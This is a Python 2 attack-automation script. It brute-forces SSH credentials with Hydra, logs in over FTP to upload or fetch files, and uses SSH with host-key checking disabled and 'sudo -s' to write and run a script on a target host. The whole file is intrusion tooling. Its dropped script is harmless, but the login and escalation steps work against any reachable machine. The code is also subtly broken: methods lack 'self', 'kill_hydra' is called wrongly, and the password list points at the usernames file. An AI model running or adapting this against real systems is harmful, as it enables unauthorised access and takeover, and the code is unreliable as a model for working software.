import os
import pexpect
import re
import time
from pexpect import pxssh
import logging as log

log.basicConfig()

class attackerClass(object):

	"===================================================================INITIALISE========================================================================="
	def __init__(self,ip,username,password,command,db_array):
		self.ip = ip
		self.username = username
		self.password = password
		self.command = command
		self.db_array = db_array
		
	"===================================================================INITIALISE========================================================================="
	
	
	def kill_hydra(self):
		os.system("pkill -f hydra")

	def hydra_spawn(self,ip):
		'''
		Start Hydra and find username and password for IP address
		If username and password found kill hydra 
		Execute collect data method
		'''
		try:
			print("Hydra BruteForce Being Executed")
			command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)	
			child = pexpect.spawn(command)	
			time.sleep(30)
			print("BruteForce Successfully Executed")
			child.close()
			kill_hydra()

		except Exception as e:
			print str(e)
			log.exception(e)

		except pexpect.EOF:
			print("BruteForce Executed")
			child.close()
			kill_hydra()

	"===================================================================FTP METHODS========================================================================="		
	#Anonymous User Methods
	def execute_ftp_login_anon_user(self,user,ip):
		'''
		FTP directly into the machine using parameters received
		'''
		try:
			print("Anonymous Login Being Executed")
			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline("ls")
			child.interact()

			print("Anonymous Login Succesfully Executed")

		except Exception as e:
			print str(e)
			log.exception(e)

	def execute_ftp_put_anon_file(user,ip):		
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''
		try:
			print("Anonymous File Creation Being Executed")
			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline("put execute.sh")
			child.interact()

			print("Anonymous File Creation Successfully Executed")

		except Exception as e:
			print str(e)
			log.exception(e)

	def execute_ftp_get_anon_file(user,ip):		
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''
		try:
			print("Anonymous File Download Executed")
			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline("get myfile.txt")
			child.interact()

			print("Anonymous File Download Succesfully Executed")

		except Exception as e:
			print str(e)
			log.exception(e)

	#Normal User Methods		
	def execute_ftp_login_normal_user(user,password,ip):
		'''
		FTP directly into the machine using parameters received
		'''
		try:
			print("Login Being Executed")
			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline("ls")
			child.interact()

			print("Login Succesfully Executed")

		except Exception as e:
			print str(e)

	def execute_ftp_put_user_file(user,password,ip):		
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''
		try:
			print("File Creation Being Executed")
			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline("put execute.sh")
			child.interact()

			print("File Creation Successfully Executed")

		except Exception as e:
			print str(e)
			log.exception(e)

	def execute_ftp_get_user_file(user,password,ip):		
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''
		try:
			print("File Download Being Executed")

			line = "ftp -p {}".format(ip)	
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline("get execute.sh")
			child.interact()

			print("File Download Succesfully Executed")

		except Exception as e:
			print str(e)
			log.exception(e)
	"===================================================================FTP METHODS========================================================================="
	
	"===================================================================SSH METHODS========================================================================="		
	#Make precautions for new key when prompted so
	def execute_ssh_login(self,user,password,ip):
		'''
		SSH directly into the machine using parameters received
		'''
		try:
			print("SSH sudo Login Being Executed")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				print("SSH sudo Login Succesful ")
			if index == 1:
				print("SSH sudo Login Succesful ")

		except Exception as e:
			print str(e)
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print("Error")
			print str(e)
			log.exception(e)

	def execute_ssh_sudo(self,user,password,ip):
		'''
		SSH directly into the machine using parameters received
		'''
		try:
			print("SSH sudo Login Being Executed") 
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				print("SSH sudo Login Succesful ")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				print("SSH sudo Login Succesful ")

		except Exception as e:
			print str(e)
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print("Error")
			print str(e)
			log.exception(e)


	def execute_ssh_create_file(self,user,password,ip):
		'''
		SSH directly into the machine using parameters received
		'''
		try:
			print("File Being Created")

			file_command = """echo '#!/bin/bash' >> exe.sh &&  echo 'echo Hello World!' >> exe.sh"""

			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				print("File Succesfully Created")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				print("File Succesfully Created")

		except Exception as e:
			print str(e)
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print str(e)
			log.exception(e)

	def execute_ssh_execute_file(self,user,password,ip):
		'''
		SSH directly into the machine using parameters received
		'''
		try:
			print("File Being Executed")
			file_command = "bash exe.sh"
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				print("File Succesfully Executed")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				print("File Succesfully Executed")

		except Exception as e:
			print str(e)
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print str(e)
			log.exception(e)
	"===================================================================SSH METHODS========================================================================="
